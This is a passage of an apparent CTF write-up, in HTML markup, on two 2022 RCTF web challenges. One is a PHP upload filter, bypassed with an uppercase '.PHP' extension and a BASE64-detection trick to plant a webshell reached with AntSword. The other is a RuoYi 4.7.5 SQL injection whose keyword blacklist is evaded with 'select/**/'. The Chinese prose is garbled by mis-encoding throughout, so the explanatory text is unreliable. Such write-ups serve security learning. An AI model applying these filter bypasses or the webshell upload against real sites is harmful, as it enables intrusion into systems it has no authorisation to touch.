language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$request</span>-&gt;server-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload success&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤åŒ…å«äº†<code>åç¼€è¿‡æ»¤</code>å’Œ<code>æ–‡ä»¶å†…å®¹è¿‡æ»¤</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>åç¼€åé»‘åå•</strong>è¿‡æ»¤ä»£ç ï¼Œè¿‡æ»¤äº†<code>php,ini,phtml,htaccess</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è¿™é‡Œæ˜¯ç”¨<code>strstr()</code>è¿›è¡ŒåŒ¹é…ï¼Œè€Œ<code>strstr()</code>æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨<code>.pHp</code>ï¼Œæˆ–è€…<code>.PHP</code>è¿›è¡Œç»•è¿‡å¯¹<code>.php</code>çš„è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br></pre></td></tr></table></figure>

<p>ä»£ç æœ€åå¯ä»¥çœ‹åˆ°åç¼€åè¢«<code>strtolower()</code>å¤„ç†ï¼Œè½¬åŒ–ä¸ºå°å†™ï¼Œä½†æ˜¯è¿™é‡Œå·²ç»ä¸å½±å“ï¼Œå› ä¸ºå‰é¢å·²ç»ç»•è¿‡äº†è¿‡æ»¤</p>
</blockquote>
<blockquote>
<p><strong>æ–‡ä»¶å†…å®¹é»‘åå•</strong>æ˜ç¡®äº†<code>&quot;&lt;?&quot;, &quot;php&quot;, &quot;handler&quot;</code></p>
<p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¯¹æ–‡ä»¶å†…å®¹çš„åˆ¤æ–­ï¼Œå…¶ä¸­æ¶‰åŠäº†<code>mb_detect_encoding()</code>å‡½æ•°</p>
<blockquote>
<p><code>mb_detect_encoding()</code>ï¼šä»æœ‰åºçš„å€™é€‰åˆ—è¡¨ä¸­ æ£€æµ‹å­—ç¬¦ä¸² æœ€å¯èƒ½çš„å­—ç¬¦ç¼–ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span>|<span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$encodings</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><code>$strict</code>æ§åˆ¶åœ¨åˆ—å‡ºçš„ä»»ä½•ç¼–ç ä¸­å­—ç¬¦ä¸²æ— æ•ˆæ—¶çš„è¡Œä¸ºã€‚å¦‚æœ<code>strict</code>è®¾ç½®ä¸º<code>false</code>ï¼Œåˆ™è¿”å›æœ€æ¥è¿‘çš„åŒ¹é…ç¼–ç ;å¦‚æœ<code>strict</code>è®¾ç½®ä¸º<code>true</code>ï¼Œåˆ™è¿”å›<code>false</code>ã€‚</p>
<p>å½“<code>$encodings</code>çœç•¥æˆ–è€…ä¸ºç©ºæ—¶ï¼Œä¼šä»<code>mb_detect_order()</code>ä¸­æŒ‰é¡ºåºè¿›è¡Œæµ‹è¯•</p>
<p>è¯¥é¢˜ä»£ç ä¸­ä¸º<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">           <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                   <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç çš„åˆ¤æ–­ä¸»è¦æ˜¯æœ‰ä¸ª<code>charset</code>çš„åˆ¤æ–­, å¦‚æœ <code>mb_detect_encoding()</code> çš„ç»“æœä¸ä¸ºç©ºã€<code>false !== $charset</code>ã€‘, å°±ä¼šå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ¤æ–­ï¼Œè€Œå½“ä¸ºç©ºæ—¶ã€<code>false == $charset</code>ã€‘ï¼Œå°±ä¼šç›´æ¥è¿”å›é€€å‡º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œä¸”åœ¨è¿™æ®µä»£ç ä¸­æœ‰æ˜¾ç¤ºï¼Œä¸ä»…éœ€è¦<code>$charset</code>ä¸ä¸ºç©ºï¼Œè¿˜éœ€è¦<code>$charset==&quot;BASE64&quot;</code></p>
<p>åˆ¤æ–­å®Œ<code>$charset</code>åï¼Œåˆå¯¹å†…å®¹è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå¦‚æœå‡ºç°ï¼Œå°±ä¼šå¤±è´¥äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨</p>
<p><img src="/post/2022RCTF/image-20230122163200935.png" alt="image-20230122163200935"></p>
<p>è¿™é‡ŒåŒ¹é…å†…å®¹çš„ä»£ç ä¸º<code>stristr($content, $v)!==false</code></p>
<p><strong>stristr</strong></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>å®ƒä¼šå¯¼è‡´å¥‡æ€ªçš„ç»“æœã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„ç»“æœå‘ç°</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>è¿”å›å€¼</p>
<p>åªæœ‰åœ¨<code>PHP</code>ç‰ˆæœ¬åœ¨<code>8.1.0 - 8.1.9</code>æ—¶ä¼šè¿”å›<code>base64</code>ï¼Œè€Œåœ¨å…¶ä»–ç‰ˆæœ¬éƒ½æ˜¯é»˜è®¤è¯†åˆ«ä¸º<code>ASCII</code></p>
<p>æŸ¥çœ‹è¿”å›åŒ…ä¸­æ•°æ®å¯çŸ¥</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 22 Jan 2023 08:40:35 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.54 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/8.1.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br></pre></td></tr></table></figure>

<p>æ­£å¥½æ˜¯<code>8.1.0 - 8.1.9</code>ç‰ˆæœ¬</p>
</blockquote>
<h4 id="libmbflæ‰“åˆ†"><a href="#libmbflæ‰“åˆ†" class="headerlink" title="libmbflæ‰“åˆ†"></a>libmbflæ‰“åˆ†</h4><blockquote>
<p>æ‰€ä»¥å®ç°&#96;&#96;$charset &#x3D;&#x3D; BASE64&#96;ï¼Œåªè¦æ–‡ä»¶å†…å®¹å‰é¢æ•°æ®è®©å®ƒè¯†åˆ«ä¸ºbase64å³å¯</p>
<p>é‚£ä¹ˆå¦‚ä½•è®©å…¶è®¤ä¸ºæ˜¯base64å‘¢ï¼Ÿ</p>
<p>è¿™å°±æ¶‰åŠåˆ°<code>libmbfl</code>çš„æ‰“åˆ†ï¼Œ<code>libmbfl</code>æ˜¯<code>mb</code>æ‰©å±•</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>æˆ‘çš„ç†è§£å°±æ˜¯ç±»ä¼¼åƒ<code>checkengine</code>ï¼Œæ¯”å¦‚<code>mb_detect_encoding()</code>è¿™ç±»çš„å‡½æ•°å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„è¯†åˆ«ï¼Œå°±æ˜¯<code>åŒ¹é…å†…å®¹ä¸­çš„ä¸€äº›ç¬¦åˆç¼–ç çš„å­—ç¬¦ï¼ŒåŒ¹é…æˆåŠŸå¯¹åº”ç¼–ç åŠ åˆ†</code>ï¼Œæœ€åä»å¤´åˆ°å°¾åŒ¹é…å®Œæˆåï¼Œ<code>æ‰“åˆ†æœ€é«˜çš„ç¼–ç å°±è¢«è®¤ä¸ºæ˜¯è¯¥å†…å®¹çš„ç¼–ç </code></p>
</blockquote>
<p>è¿™æ˜¯æ‰“åˆ†åˆ¤æ–­</p>
<blockquote>
<p>0xFFFFæ˜¯-1ï¼Œ&gt;&#x3D;0 </p>
<blockquote>
<p>0x21æ˜¯33 33å¯¹åº”!</p>
<p>0x2Fæ˜¯47 47å¯¹åº”&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>æ‰“åˆ†æ‰“çš„å¤šï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸€å¥è¯ğŸå‰åŠ å…¥è®¸å¤š<code>/</code></p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230122195735469.png" alt="image-20230122195735469"></p>
<p>è¿™æ˜¯<code>mb_encoding_detect()</code>è¿”å›åˆ¤æ–­å¾—åˆ°ç¼–ç ç±»å‹çš„é€»è¾‘</p>
<blockquote>
<p>å› ä¸º<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code>ï¼Œæ‰€ä»¥æŒ‰ç…§å¾—åˆ†åŒ¹é…ï¼Œå¦‚æœæ˜¯æƒ³è¦è¿”å›<code>base64</code>ï¼Œå°±éœ€è¦å†…å®¹ä¸­<code>base64</code>å¾—åˆ†æœ€é«˜ï¼Œæ‰å¯ä»¥å®ç°è¿”å›ä¸º<code>base64</code></p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230122195835984.png" alt="image-20230122195835984"></p>
<h3 id="ç»¼ä¸Š"><a href="#ç»¼ä¸Š" class="headerlink" title="ç»¼ä¸Š"></a><strong>ç»¼ä¸Š</strong></h3><blockquote>
<p>ä¸Šä¼ çš„æ–‡ä»¶éœ€è¦æ»¡è¶³</p>
<p>1.åç¼€ä¸èƒ½ä¸º<code>.php</code>ç­‰ï¼Œå¯ä»¥ä¸ºå¤§å°å†™æ··å†™æˆ–è€…çº¯å¤§å†™ï¼Œå¦‚<code>.pHpï¼Œ.PHP</code>ç­‰ç­‰</p>
<p>2.æ–‡ä»¶å†…å®¹å‰é¢éœ€è¦å¯ä»¥è¢«è¯†åˆ«ä¸º<code>base64</code>ï¼Œè€Œåé¢çš„è¿‡æ»¤çš„å†…å®¹å…¶å®å°±ä¸ç”¨è€ƒè™‘äº†ï¼Œå› ä¸ºåœ¨åˆ¤æ–­å‰ç»è¿‡</p>
<p><code>$content=base64_decode($content)</code></p>
<p><img src="/post/2022RCTF/image-20230122213729640.png" alt="image-20230122213729640"></p>
<p>å¯ä»¥å‘ç°åŸæ¥çš„å†…å®¹åœ¨è¢«è§£ç åï¼Œå‘ç”Ÿäº†å˜åŒ–ï¼Œç»“æœè½¬åŒ–ä¸ºä¹±ç ï¼Œäºæ˜¯ç»•è¿‡äº†é»‘åå•è¿‡æ»¤</p>
<p>ã€å½“ç„¶å‰ææ˜¯<code>$charset == BASE64</code>ï¼Œä¹Ÿå°±æ˜¯æ‰“åˆ†å¤Ÿäº†ã€‘</p>
</blockquote>
<p>äºæ˜¯æœ€åçš„æ–‡ä»¶å†…å®¹ä¸º</p>
<p><img src="/post/2022RCTF/image-20230122210900608.png" alt="image-20230122210900608"></p>
<p>è®¿é—®<code>1.PHP</code></p>
<p><img src="/post/2022RCTF/image-20230122210957493.png" alt="image-20230122210957493"></p>
<p>æ‹¿èšå‰‘è¿æ¥</p>
<p><img src="/post/2022RCTF/image-20230122164102078.png" alt="image-20230122164102078"></p>
<p>æœ€åå¾—åˆ°<code>flag</code></p>
<p><img src="/post/2022RCTF/image-20230122164115830.png" alt="image-20230122164115830"></p>
<h2 id="ezruoyi"><a href="#ezruoyi" class="headerlink" title="ezruoyi"></a>ezruoyi</h2><blockquote>
<p>hint:<code>RuoYi v4.7.5</code></p>
</blockquote>
<blockquote>
<p>é™„ä»¶ï¼š</p>
<p><code>https://drive.google.com/file/d/1vd8-tzGCX5Nra2vNTvJerjyW4KQDaAtE/view?usp=sharing</code></p>
<p>or</p>
<p><code>https://share.weiyun.com/wCvo3QJ0</code></p>
</blockquote>
<hr>
<blockquote>
<p>ä»€ä¹ˆæ˜¯RuoYiï¼Ÿ</p>
<p>RuoYiæ˜¯ä¸€ä¸ª <strong>Java EE ä¼ä¸šçº§å¿«é€Ÿå¼€å‘å¹³å°</strong>ï¼ŒåŸºäºç»å…¸æŠ€æœ¯ç»„åˆï¼ˆSpring Bootã€Apache Shiroã€MyBatisã€Thymeleafã€Bootstrapï¼‰ï¼Œå†…ç½®æ¨¡å—å¦‚ï¼šéƒ¨é—¨ç®¡ç†ã€è§’è‰²ç”¨æˆ·ã€èœå•åŠæŒ‰é’®æˆæƒã€æ•°æ®æƒé™ã€ç³»ç»Ÿå‚æ•°ã€æ—¥å¿—ç®¡ç†ã€é€šçŸ¥å…¬å‘Šç­‰ã€‚</p>
</blockquote>
<p>è¿™ä¸ª<code>ruoyi v4.75æ˜¯</code>ä¸€ä¸ª0dayé¢˜ç›®</p>
<p>æ­å»ºæœ¬åœ°ç¯å¢ƒæœ‰é—®é¢˜ï¼Œåªæœ‰çœ‹çœ‹æºç å’Œå¸ˆå‚…ä»¬çš„wpæ€»ç»“ä¸€ä¸‹</p>
<hr>
<p>å…ˆè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œæ ¹æ®hintï¼ŒæŸ¥æ‰¾ruoyiv 4.75ä»¥åŠå…¶ä¹‹å‰çš„å¸¸å‡ºç°çš„æ¼æ´ç‚¹</p>
<p><a href="https://cn-sec.com/archives/1256773.html">https://cn-sec.com/archives/1256773.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/304666.html">https://www.freebuf.com/articles/web/304666.html</a></p>
<p>è¿™ä¸¤ç¯‡æ–‡ç« æåˆ°<code>Ruoyi&lt;=4.6.1</code>å­˜åœ¨åå°sqlæ³¨å…¥æ¼æ´</p>
<p>å¯¹<code>ruoyi-admin.jar</code>åŒ…è¿›è¡ŒæŸ¥æ‰¾ï¼Œ</p>
<p>åœ¨ <code>ruoyi-generator-4.7.5.jar</code>æ‰¾åˆ°<code>GenTablrServiceImpl.class</code></p>
<p><img src="/post/2022RCTF/image-20230304225854115.png" alt="image-20230304225854115"></p>
<p>å…¶ä¸­çš„sqlè¯­å¥ä¸º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">create</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    SqlUtil.filterKeyword(sql);</span><br><span class="line">    List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);</span><br><span class="line">    List&lt;String&gt; tableNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (SQLStatement sqlStatement : sqlStatements) &#123;</span><br><span class="line">      <span class="keyword">if</span> (sqlStatement <span class="keyword">instanceof</span> MySqlCreateTableStatement) &#123;</span><br><span class="line">        <span class="type">MySqlCreateTableStatement</span> <span class="variable">createTableStatement</span> <span class="operator">=</span> (MySqlCreateTableStatement)sqlStatement;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.genTableService.createTable(createTableStatement.toString())) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">tableName</span> <span class="operator">=</span> createTableStatement.getTableName().replaceAll(<span class="string">&quot;`&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">          tableNames.add(tableName);</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    List&lt;GenTable&gt; tableList = <span class="built_in">this</span>.genTableService.selectDbTableListByNames(tableNames.&lt;String&gt;toArray(<span class="keyword">new</span> <span class="title class_">String</span>[tableNames.size()]));</span><br><span class="line">    <span class="type">String</span> <span class="variable">operName</span> <span class="operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="string">&quot;loginName&quot;</span>));</span><br><span class="line">    <span class="built_in">this</span>.genTableService.importGenTable(tableList, operName);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="built_in">this</span>.logger.error(e.getMessage(), e);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;åˆ›å»ºè¡¨ç»“æ„å¼‚å¸¸[&quot;</span> + e.getMessage() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°sqlæ³¨å…¥è¿‡æ»¤åˆ¤æ–­ï¼Œè·Ÿè¿›<code>SqlUtil</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SqlUtil.filterKeyword(sql);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruoyi.common.utils.sql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ruoyi.common.exception.UtilException;</span><br><span class="line"><span class="keyword">import</span> com.ruoyi.common.utils.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlUtil</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_PATTERN</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9_\\ \\,\\.]+&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">escapeOrderBySql</span><span class="params">(String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotEmpty(value) &amp;&amp; !isValidOrderBySql(value))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UtilException</span>(<span class="string">&quot;); </span></span><br><span class="line"><span class="string">    return value;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static boolean isValidOrderBySql(String value) &#123;</span></span><br><span class="line"><span class="string">    return value.matches(SQL_PATTERN);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static void filterKeyword(String value) &#123;</span></span><br><span class="line"><span class="string">    if (StringUtils.isEmpty(value))</span></span><br><span class="line"><span class="string">      return; </span></span><br><span class="line"><span class="string">    String[] sqlKeywords = StringUtils.split(SQL_REGEX, &quot;</span>\\|<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    for (String sqlKeyword : sqlKeywords) &#123;</span></span><br><span class="line"><span class="string">      if (StringUtils.indexOfIgnoreCase(value, sqlKeyword) &gt; -1)</span></span><br><span class="line"><span class="string">        throw new UtilException(&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°æ­£åˆ™è¿‡æ»¤äº†å¾ˆå¤š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹è¿˜ä»¥ä¸ºç›´æ¥å µæ­»äº†ï¼Œä½†æ˜¯å®ƒå®é™…è¿‡æ»¤çš„æ˜¯<code>select_(ç©ºæ ¼)</code>ï¼Œè€Œéè¿‡æ»¤äº†selectï¼Œç”¨<code>select/**/</code>å¯ä»¥è¿›è¡Œç»•è¿‡</p>
<p><a href="https://gitee.com/y_project/RuoYi/pulls/403">https://gitee.com/y_project/RuoYi/pulls/403</a></p>
